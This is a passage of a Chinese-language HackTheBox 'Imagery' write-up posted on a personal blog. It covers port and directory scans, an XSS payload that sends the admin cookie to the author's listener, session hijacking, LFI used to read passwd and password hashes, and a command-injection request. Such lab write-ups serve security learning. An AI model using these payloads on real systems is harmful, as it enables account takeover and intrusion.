@@ -1,0 +1,722 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一路望 跌跌撞 午夜流星何去何往路海长 青夜旷 越过群山追斜阳  信息收集1234567891011121314151617181920212223242526272829303132333435363738394041.&#x2F;rustscan -a 10.129.23.190.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &amp;#123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Imagery">
+<meta property="og:url" content="http://example.com/2025/11/20/HackTheBox-Imagery/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="一路望 跌跌撞 午夜流星何去何往路海长 青夜旷 越过群山追斜阳  信息收集1234567891011121314151617181920212223242526272829303132333435363738394041.&#x2F;rustscan -a 10.129.23.190.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &amp;#123">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_TlShrfzAzu.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_hENaeP3HjY.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_wEjJ5wnrUz.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_fC5QYbw422.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/cloudmusic_ZOaqvu4dvf.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_TRRREDVS0i.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/msedge_HXQ3U9nNSd.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_AnvCZpHjlO.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_2bRLVZfX9H.png">
+<meta property="og:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/msedge_vQTk8tFsG3.png">
+<meta property="article:published_time" content="2025-11-20T00:11:54.000Z">
+<meta property="article:modified_time" content="2025-11-20T01:32:50.251Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/11/20/HackTheBox-Imagery/vmware_TlShrfzAzu.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackTheBox-Imagery - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Imagery"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-20 08:11" pubdate>
+          November 20, 2025 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackTheBox-Imagery</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>一路望 跌跌撞 午夜流星何去何往<br>路海长 青夜旷 越过群山追斜阳</p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">./rustscan -a <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span><br>.<span class="hljs-comment">----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-<span class="hljs-string">&#x27; `-&#x27;</span>`<span class="hljs-comment">-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br>The Modern Day Port Scanner.<br>________________________________________<br>: http://discord.skerritt.blog         :<br>: https://github.com/RustScan/RustScan :<br> <span class="hljs-comment">--------------------------------------</span><br>Scanning ports faster than you can say <span class="hljs-string">&#x27;SYN ACK&#x27;</span><br><br>[~] The config file <span class="hljs-keyword">is</span> expected <span class="hljs-keyword">to</span> be at &quot;/root/.rustscan.toml&quot;<br>[!] File <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> lower than <span class="hljs-keyword">default</span> batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-comment">--ulimit. May cause harm to sensitive servers</span><br>[!] Your file <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> very small, which negatively impacts RustScan<span class="hljs-string">&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;</span><span class="hljs-comment">--ulimit 5000&#x27;. </span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span>:<span class="hljs-number">22</span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span>:<span class="hljs-number">8000</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-19</span> <span class="hljs-number">19</span>:<span class="hljs-number">11</span> EST<br>Initiating Ping Scan at <span class="hljs-number">19</span>:<span class="hljs-number">11</span><br>Scanning <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span> [<span class="hljs-number">4</span> ports]<br>Completed Ping Scan at <span class="hljs-number">19</span>:<span class="hljs-number">11</span>, <span class="hljs-number">0.12</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">11</span><br>Completed Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">11</span>, <span class="hljs-number">0.00</span>s elapsed<br>DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.01</span>s. Mode: Async [#: <span class="hljs-number">1</span>, OK: <span class="hljs-number">0</span>, NX: <span class="hljs-number">1</span>, DR: <span class="hljs-number">0</span>, SF: <span class="hljs-number">0</span>, TR: <span class="hljs-number">1</span>, CN: <span class="hljs-number">0</span>]<br>Initiating SYN Stealth Scan at <span class="hljs-number">19</span>:<span class="hljs-number">11</span><br>Scanning <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span> [<span class="hljs-number">2</span> ports]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">22</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span><br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">8000</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span><br>Completed SYN Stealth Scan at <span class="hljs-number">19</span>:<span class="hljs-number">11</span>, <span class="hljs-number">0.20</span>s elapsed (<span class="hljs-number">2</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.23</span><span class="hljs-number">.190</span><br>Host <span class="hljs-keyword">is</span> up, received echo-reply ttl <span class="hljs-number">63</span> (<span class="hljs-number">0.11</span>s latency).<br>Scanned at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-19</span> <span class="hljs-number">19</span>:<span class="hljs-number">11</span>:<span class="hljs-number">44</span> EST <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>s<br><br>PORT     STATE SERVICE  REASON<br><span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh      syn-ack ttl <span class="hljs-number">63</span><br><span class="hljs-number">8000</span>/tcp <span class="hljs-keyword">open</span>  http-alt syn-ack ttl <span class="hljs-number">63</span><br><br><span class="hljs-keyword">Read</span> data files <span class="hljs-keyword">from</span>: /usr/<span class="hljs-keyword">share</span>/nmap<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.43</span> seconds<br>           Raw packets sent: <span class="hljs-number">6</span> (<span class="hljs-number">240</span>B) | Rcvd: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">dirsearch -u http:<span class="hljs-comment">//10.129.23.190:8000/</span><br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class="hljs-number">23</span>: UserWarning: pkg_resources <span class="hljs-keyword">is</span> <span class="hljs-keyword">deprecated</span> <span class="hljs-keyword">as</span> an API. See https:<span class="hljs-comment">//setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br>  <span class="hljs-keyword">from</span> pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP <span class="hljs-keyword">method</span>: GET | Threads: <span class="hljs-number">25</span> | Wordlist size: <span class="hljs-number">11460</span><br><br>Output File: /home/kali/Desktop/reports/http_10.<span class="hljs-number">129.23</span>.<span class="hljs-number">190</span>_8000/__25-<span class="hljs-number">11</span>-<span class="hljs-number">19</span>_19-<span class="hljs-number">14</span>-<span class="hljs-number">01</span>.txt<br><br>Target: http:<span class="hljs-comment">//10.129.23.190:8000/</span><br><br>[<span class="hljs-number">19</span>:<span class="hljs-number">14</span>:<span class="hljs-number">01</span>] Starting:                                                                                                                                       <br>[<span class="hljs-number">19</span>:<span class="hljs-number">15</span>:<span class="hljs-number">04</span>] <span class="hljs-number">401</span> -   <span class="hljs-number">59</span>B  - /images                                           <br>[<span class="hljs-number">19</span>:<span class="hljs-number">15</span>:<span class="hljs-number">09</span>] <span class="hljs-number">405</span> -  <span class="hljs-number">153</span>B  - /login                                            <br>[<span class="hljs-number">19</span>:<span class="hljs-number">15</span>:<span class="hljs-number">10</span>] <span class="hljs-number">405</span> -  <span class="hljs-number">153</span>B  - /logout                                           <br>[<span class="hljs-number">19</span>:<span class="hljs-number">15</span>:<span class="hljs-number">26</span>] <span class="hljs-number">405</span> -  <span class="hljs-number">153</span>B  - /<span class="hljs-keyword">register</span>                                         <br>[<span class="hljs-number">19</span>:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>] <span class="hljs-number">401</span> -   <span class="hljs-number">32</span>B  - /uploads/affwp-debug.log                          <br>[<span class="hljs-number">19</span>:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>] <span class="hljs-number">401</span> -   <span class="hljs-number">32</span>B  - /uploads/dump.sql<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/20/HackTheBox-Imagery/vmware_TlShrfzAzu.png" srcset="/img/loading.gif" lazyload></p>
+<p>有两个人名，可能是已注册用户。</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/vmware_hENaeP3HjY.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试上传恶意图片马。</p>
+<p>失败。</p>
+<h3 id="GetWeb"><a href="#GetWeb" class="headerlink" title="GetWeb"></a>GetWeb</h3><hr>
+<p>注意到报告bug功能，尝试xss盗取管理员cookie。</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/vmware_wEjJ5wnrUz.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;this.src=&#x27;http://10.10.14.2:4444/steal?cookie=&#x27; + encodeURIComponent(document.cookie)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">nc <span class="hljs-operator">-</span>lvvp <span class="hljs-number">4444</span><br>listening on [any] <span class="hljs-number">4444</span> ...<br><span class="hljs-number">10.129</span>.<span class="hljs-number">23.190</span>: inverse host lookup <span class="hljs-params">failed:</span> Unknown host<br>connect to [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span>] from (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">23.190</span>] <span class="hljs-number">56356</span><br>GET <span class="hljs-operator">/</span>steal<span class="hljs-operator">?</span>cookie<span class="hljs-operator">=</span>session%<span class="hljs-number">3</span>D.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aR5iPQ.<span class="hljs-number">84</span>Jw6rHGvetua_XhsybyRrns4fU HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span>:<span class="hljs-number">4444</span><br><span class="hljs-params">Connection:</span> keep-alive<br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (X11; Linux x86_64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) HeadlessChrome<span class="hljs-symbol">/138.0.0.0</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Accept:</span> image<span class="hljs-operator">/</span>avif,image<span class="hljs-operator">/</span>webp,image<span class="hljs-operator">/</span>apng,image<span class="hljs-operator">/</span>svg<span class="hljs-operator">+</span>xml,image<span class="hljs-comment">/*,*/</span><span class="hljs-operator">*</span>;<span class="hljs-attr">q</span><span class="hljs-operator">=</span><span class="hljs-number">0.8</span><br><span class="hljs-params">Referer:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8000</span><span class="hljs-symbol">/</span><br><span class="hljs-params">Accept-Encoding:</span> gzip, deflate<br><span class="hljs-params">Accept-Language:</span> en-US,en;<span class="hljs-attr">q</span><span class="hljs-operator">=</span><span class="hljs-number">0.9</span><br><br> sent <span class="hljs-number">0</span>, rcvd <span class="hljs-number">567</span><br><br></code></pre></td></tr></table></figure>
+
+<p>之后将cookie替换成功登录到管理员界面</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/vmware_fC5QYbw422.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意到还有一个测试用户。</p>
+<p>下载日志，但是日志内容里只有关于登录成功的信息。</p>
+<p>经过测试，这里的下载功能是个LFI。</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/cloudmusic_ZOaqvu4dvf.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时经过读取passwd知道了uid为1000的web用户</p>
+<p>这里有一个特殊路径可以获取网站用户下的所有哈希。</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/vmware_TRRREDVS0i.png" srcset="/img/loading.gif" lazyload></p>
+<p>解出测试用户的密码</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/msedge_HXQ3U9nNSd.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功登录为测试用户，测试用户可以对图片进行一系列的修改</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/vmware_AnvCZpHjlO.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ada">POST /apply_visual_transform HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.129</span>.<span class="hljs-number">23.190</span>:<span class="hljs-number">8000</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">128.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">128.0</span><br><span class="hljs-keyword">Accept</span>: */*<br><span class="hljs-keyword">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0.5</span><br><span class="hljs-keyword">Accept</span>-Encoding: gzip, deflate, br<br>Referer: http://<span class="hljs-number">10.129</span>.<span class="hljs-number">23.190</span>:<span class="hljs-number">8000</span>/<br>Content-<span class="hljs-keyword">Type</span>: application/json<br>Content-Length: <span class="hljs-number">119</span><br>Origin: http://<span class="hljs-number">10.129</span>.<span class="hljs-number">23.190</span>:<span class="hljs-number">8000</span><br>Connection: keep-alive<br>Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aR5mqg.tM7gdyZY7GzCBeCqCL2LUrgKxoo<br>Priority: u=<span class="hljs-number">0</span><br>&#123;<span class="hljs-string">&quot;imageId&quot;</span>:<span class="hljs-string">&quot;2c3fad6b-0e18-4f72-bab0-5795cf332821&quot;</span>,<span class="hljs-string">&quot;transformType&quot;</span>:<span class="hljs-string">&quot;crop&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:&#123;<span class="hljs-string">&quot;x&quot;</span>:<span class="hljs-number">3</span>,<span class="hljs-string">&quot;y&quot;</span>:<span class="hljs-number">6</span>,<span class="hljs-string">&quot;width&quot;</span>:<span class="hljs-number">24</span>,<span class="hljs-string">&quot;height&quot;</span>:<span class="hljs-number">24</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>经过测试，这里存在命令注入。</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/vmware_2bRLVZfX9H.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">POST</span> <span class="hljs-regexp">/apply_visual_transform HTTP/</span><span class="hljs-number">1.1</span><br><span class="hljs-type">Host</span>: <span class="hljs-number">10.129</span>.<span class="hljs-number">23.190</span>:<span class="hljs-number">8000</span><br><span class="hljs-type">User</span><span class="hljs-operator">-</span><span class="hljs-type">Agent</span>: <span class="hljs-type">Mozilla</span><span class="hljs-regexp">/5.0 (X11; Linux x86_64; rv:128.0) Gecko/</span><span class="hljs-number">20100101</span> <span class="hljs-type">Firefox</span><span class="hljs-operator">/</span><span class="hljs-number">128.0</span><br><span class="hljs-type">Accept</span>: <span class="hljs-operator">*/*</span><br><span class="hljs-type">Accept</span><span class="hljs-operator">-</span><span class="hljs-type">Language</span>: en<span class="hljs-operator">-</span><span class="hljs-type">US</span>,en;q<span class="hljs-operator">=</span><span class="hljs-number">0.5</span><br><span class="hljs-type">Accept</span><span class="hljs-operator">-</span><span class="hljs-type">Encoding</span>: gzip, deflate, br<br><span class="hljs-type">Referer</span>: http:<span class="hljs-comment">//10.129.23.190:8000/</span><br><span class="hljs-type">Content</span><span class="hljs-operator">-</span><span class="hljs-type">Type</span>: application<span class="hljs-operator">/</span>json<br><span class="hljs-type">Content</span><span class="hljs-operator">-</span><span class="hljs-type">Length</span>: <span class="hljs-number">124</span><br><span class="hljs-type">Origin</span>: http:<span class="hljs-comment">//10.129.23.190:8000</span><br><span class="hljs-type">Connection</span>: keep<span class="hljs-operator">-</span>alive<br><span class="hljs-type">Cookie</span>: session<span class="hljs-operator">=</span>.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5<span class="hljs-operator">-</span>xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS<span class="hljs-operator">-</span><span class="hljs-type">Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m</span><span class="hljs-operator">-</span>cP4Ay4kxcQ.aR5mqg.tM7gdyZY7GzCBeCqCL2LUrgKxo<br><span class="hljs-type">Priority</span>: u<span class="hljs-operator">=</span><span class="hljs-number">0</span><br>&#123;<span class="hljs-string">&quot;imageId&quot;</span>:<span 